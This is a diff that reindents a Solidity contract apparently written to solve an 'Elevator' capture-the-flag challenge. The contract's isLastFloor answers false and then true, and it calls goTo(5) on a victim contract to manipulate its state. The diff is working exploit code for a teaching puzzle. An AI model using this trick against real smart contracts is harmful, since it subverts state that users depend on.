@@ -45,17 +45,17 @@ contract Solution is Building{
 bool ilk_mi=true;
 Elevator elev;
 function isLastFloor(uint256)  external  returns  (bool){
-if  (ilk_mi){
-	ilk_mi=false;
-	return  false;
+	if(ilk_mi){
+		ilk_mi=false;
+		return  false;
 	}
 
-return  true;
+	return  true;
 }
 
 function basla(address victim)  public{
-elev = Elevator(victim);
-elev.goTo(5);
+	elev = Elevator(victim);
+	elev.goTo(5);
   
 	}
 }
